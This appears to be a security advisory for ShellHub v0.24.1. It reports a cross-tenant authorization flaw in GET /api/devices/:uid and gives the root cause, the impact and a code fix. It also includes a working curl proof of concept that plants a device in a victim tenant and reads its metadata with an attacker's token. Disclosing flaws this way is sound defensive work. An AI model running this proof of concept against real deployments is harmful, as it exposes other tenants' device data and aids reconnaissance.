summary: "ShellHub has cross-tenant IDOR in `GET /api/devices/:uid` that discloses device data\
  \ of any namespace\n## Summary\n`GET /api/devices/:uid` returns the full device object whenever\
  \ the caller is authenticated, without verifying that the device belongs to the caller's namespace\
  \ (tenant). Any authenticated user (JWT or API Key) who knows or can guess a device UID can\
  \ read device metadata from any other namespace.\n\n## Severity\n**CVSS 3.1: 7.5 (High)**\
  \ \nCWE-639 — Authorization Bypass Through User-Controlled Key\n\n## Affected versions\nShellHub\
  \ Community v0.24.1 (validated). Likely all prior versions that share this handler.\n\n##\
  \ Root cause\n`api/services/device.go:97-104` — `GetDevice` resolves the device by UID without\
  \ scoping to the caller's tenant:\n\n  ```go\n  func (s *service) GetDevice(ctx context.Context,\
  \ uid models.UID) (*models.Device, error) {\n      device, err := s.store.DeviceResolve(ctx,\
  \ store.DeviceUIDResolver, string(uid))\n      // ⚠️ missing: s.store.Options().InNamespace(tenant)\n\
  \      ...\n  }\n  ```\n\nCompare with `DeleteDevice` in the same file (line 137) which correctly\
  \ applies `InNamespace(tenant)`.\n\nThe `Authorize` middleware (`api/routes/middleware/authorize.go:12-27`)\
  \ only checks that a tenant is present in the context — not that the resource belongs to that\
  \ tenant.\n\n## Proof of concept (validated live against v0.24.1)\n\nPre-requisite: attacker\
  \ has any valid user account and knows a target `tenant_id` (UUIDs frequently leak via UI\
  \ URLs, email invites, support channels, or prior namespace membership).\n\n  ```bash\n  ATTACKER_TOKEN=$(curl\
  \ -s -X POST http://target/api/login \\\n    -H 'Content-Type: application/json' \\\n    -d\
  \ '{\"username\":\"attacker\",\"password\":\"...\"}' | jq -r .token)\n\n  TARGET_TENANT=\"\
  <victim-tenant-uuid>\"\n\n  # Plant a device in the victim tenant via the public device-auth\
  \ endpoint\n  # (this also works when the victim already has devices and the attacker\n  #\
  \ merely guessed/obtained a real UID via another vector)\n  VICTIM_UID=$(curl -s -X POST http://target/api/devices/auth\
  \ \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\n      \\\"info\\\":{\\\"id\\\
  \":\\\"x\\\",\\\"pretty_name\\\":\\\"x\\\",\\\"version\\\":\\\"v0.24.1\\\",\\\"arch\\\":\\\
  \"amd64\\\",\\\"platform\\\":\\\"docker\\\"},\n      \\\"hostname\\\":\\\"poc\\\",\n     \
  \ \\\"identity\\\":{\\\"mac\\\":\\\"aa:bb:cc:dd:ee:ff\\\"},\n      \\\"public_key\\\":\\\"\
  -----BEGIN RSA PUBLIC KEY-----\\\\nx\\\\n-----END RSA PUBLIC KEY-----\\\",\n      \\\"tenant_id\\\
  \":\\\"$TARGET_TENANT\\\"\n    }\" | jq -r .uid)\n\n  # Read the device from a completely\
  \ different tenant\n  curl -i \"http://target/api/devices/$VICTIM_UID\" \\\n    -H \"Authorization:\
  \ Bearer $ATTACKER_TOKEN\"\n  # Expected (fixed):   HTTP 403/404\n  # Observed (v0.24.1):\
  \ HTTP 200 + full device JSON (tenant_id, public_key, MAC,\n  #                     namespace\
  \ name, OS info, last_seen, remote_addr, ...)\n  ```\n\n## Impact\n  - Cross-tenant disclosure\
  \ of device metadata: hostname, MAC, OS fingerprint, public SSH key, namespace name, last-seen\
  \ timestamp, remote address.\n  - Enables namespace enumeration, device inventory reconnaissance\
  \ of other tenants, and targeted follow-up attacks.\n\n## Suggested fix\nIn `api/services/device.go`\
  \ `GetDevice`, extract tenant from context and apply `InNamespace`:\n\n  ```go\n  func (s\
  \ *service) GetDevice(ctx context.Context, uid models.UID) (*models.Device, error) {\n   \
  \   tenant := gateway.TenantFromContext(ctx)\n      opts := []store.QueryOption{}\n      if\
  \ tenant != nil {\n          opts = append(opts, s.store.Options().InNamespace(tenant.ID))\n\
  \      }\n      device, err := s.store.DeviceResolve(ctx, store.DeviceUIDResolver, string(uid),\
  \ opts...)\n      ...\n  }\n  ```"
